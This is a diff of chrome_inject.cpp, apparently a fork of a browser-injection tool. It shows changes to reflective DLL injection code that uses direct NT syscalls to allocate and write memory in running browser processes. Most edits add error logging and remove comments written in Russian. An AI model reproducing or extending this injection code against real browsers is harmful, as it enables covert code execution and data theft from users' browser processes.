@@ -1,5 +1,5 @@
 // chrome_inject.cpp
-// v0.14.0 (c) Alexander 'xaitax' Hagenah, modified for automatic browser detection and default browser start
+// v0.14.1 (c) Alexander 'xaitax' Hagenah, modified for automatic browser detection and default browser start
 // Licensed under the MIT License. See LICENSE file in the project root for full license information.
 
 #include <Windows.h>
@@ -86,7 +86,6 @@ struct HandleGuard
 
 namespace Injector
 {
-    // MODIFIED: Удалено поле autoStartBrowser, browserType не нужно
     struct Configuration
     {
         bool verbose = false;
@@ -142,7 +141,6 @@ namespace Injector
             SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
         }
 
-        // MODIFIED: Обновлен вывод справки, убрано упоминание -s и browser_type
         void PrintUsage()
         {
             HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
@@ -478,6 +476,7 @@ namespace Injector
             status = NtWriteVirtualMemory_syscall(proc, remoteMem, (PVOID)dllBuffer.data(), dllBuffer.size(), &bytesWritten);
             if (!NT_SUCCESS(status))
             {
+                UI::PrintStatus("[-]", "RDI: NtWriteVirtualMemory failed. Status: " + Utils::NtStatusToString(status) + ", Bytes written: " + std::to_string(bytesWritten));
                 return false;
             }
 
@@ -741,7 +740,7 @@ namespace Injector
         return configs;
     }
 
-    // MODIFIED: Обновлена функция Run для обработки нескольких браузеров
+    // MODIFIED: Обновлена функция Run для обработки нескольких браузеров и диагностики ошибок
     int Run(int argc, wchar_t *argv[])
     {
         UI::DisplayBanner();
@@ -840,7 +839,7 @@ namespace Injector
             LPVOID remotePipeNameAddr = nullptr;
             SIZE_T pipeNameSize = (ipcPipeNameW.length() + 1) * sizeof(wchar_t);
 
-            UI::LogDebug("Calling NtAllocateVirtualMemory_syscall...");
+            UI::LogDebug("Calling NtAllocateVirtualMemory_syscall for pipe name...");
             NTSTATUS statusAlloc = NtAllocateVirtualMemory_syscall(
                 targetProcess.get(),
                 &remotePipeNameAddr,
@@ -851,7 +850,7 @@ namespace Injector
             UI::LogDebug("NtAllocateVirtualMemory_syscall returned " + Utils::NtStatusToString(statusAlloc));
             if (!NT_SUCCESS(statusAlloc))
             {
-                UI::PrintStatus("[-]", "NtAllocateVirtualMemory failed for " + config.browserDisplayName);
+                UI::PrintStatus("[-]", "NtAllocateVirtualMemory for pipe name failed for " + config.browserDisplayName + ". Status: " + Utils::NtStatusToString(statusAlloc));
                 continue;
             }
 
@@ -866,17 +865,19 @@ namespace Injector
             };
             std::unique_ptr<void, decltype(remoteMemFreer)> remoteMemGuard(remotePipeNameAddr, remoteMemFreer);
 
-            UI::LogDebug("Calling NtWriteVirtualMemory_syscall...");
+            // MODIFIED: Добавлено подробное логирование параметров NtWriteVirtualMemory
+            UI::LogDebug("Calling NtWriteVirtualMemory_syscall for pipe name at " + Utils::PtrToHexStr(remotePipeNameAddr) + ", size: " + std::to_string(pipeNameSize));
+            SIZE_T bytesWritten = 0;
             NTSTATUS statusWrite = NtWriteVirtualMemory_syscall(
                 targetProcess.get(),
                 remotePipeNameAddr,
                 (PVOID)ipcPipeNameW.c_str(),
                 pipeNameSize,
-                nullptr);
-            UI::LogDebug("NtWriteVirtualMemory_syscall returned " + Utils::NtStatusToString(statusWrite));
+                &bytesWritten);
+            UI::LogDebug("NtWriteVirtualMemory_syscall returned " + Utils::NtStatusToString(statusWrite) + ", bytes written: " + std::to_string(bytesWritten));
             if (!NT_SUCCESS(statusWrite))
             {
-                UI::PrintStatus("[-]", "NtWriteVirtualMemory failed for " + config.browserDisplayName);
+                UI::PrintStatus("[-]", "NtWriteVirtualMemory for pipe name failed for " + config.browserDisplayName + ". Status: " + Utils::NtStatusToString(statusWrite) + ", Bytes written: " + std::to_string(bytesWritten));
                 continue;
             }
 
